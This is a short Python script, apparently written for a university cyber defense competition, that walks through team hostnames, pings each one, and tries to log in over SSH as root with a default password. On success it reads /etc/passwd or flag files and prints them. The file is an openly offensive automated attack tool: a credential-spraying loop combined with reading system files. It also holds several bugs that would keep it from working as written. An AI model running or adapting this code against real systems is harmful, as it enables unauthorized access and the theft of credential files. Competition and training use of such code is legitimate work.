#!/usr/bin/python

import os
import sys
import paramiko
import pyping

machines = [ "ad", "accesscontrol", "pbx", "wiki", "devices", "www" ]
numTeams = 30

def parseName(machineName):
    return(machineName.split[0])

def captureFlag(machineName, sshclient):
    machine = parseName(machineName)
    filename = "/etc/passwd"
    if machine == "accesscontrol":
        filename = "/etc/*flag"
    elif machine == "wiki":
        filename = "/etc/*flag"
    elif machine == "devices":
        filename = "/etc/*flag"
    elif machine == "www":
        filename = "/home/dflynn/*flag"
    command = "cat " + filename
    ssh_stdin, ssh_stdout, ssh_stderr = sshclient.exec_command(command)
    print("Flag from " + machineName + ": " + ssh_stdout)
  
    

def tryDefaultCreds(machineName):
    print("Trying to ssh to " + machineName)
    sshClient = paramiko.client.SSHClient()
    try:
        sshClient.connect(machineName, username="root", password="cdc")
        print("default creds worked")
        captureFlag(machineName,sshClient)
        sshClient.close()
    except:
        print("connection failed")

def findMachines():
    for n in range(1,30):
        for machine in machines[:]:
            print("searching for "+ machine + " in team" + str(n))
            machineName = machine + ".team" + str(n) + ".isucdc.com"
            print machineName
            response = pyping.ping(machineName)
            if response.ret_code == 0:
                print("reachable")
                tryDefaultCreds(machineName)
            else:
                print("unreachable")
            
    

def main():
    print("Running 2018 autopwn script\n")
    findMachines()


if __name__ == '__main__':
    main()



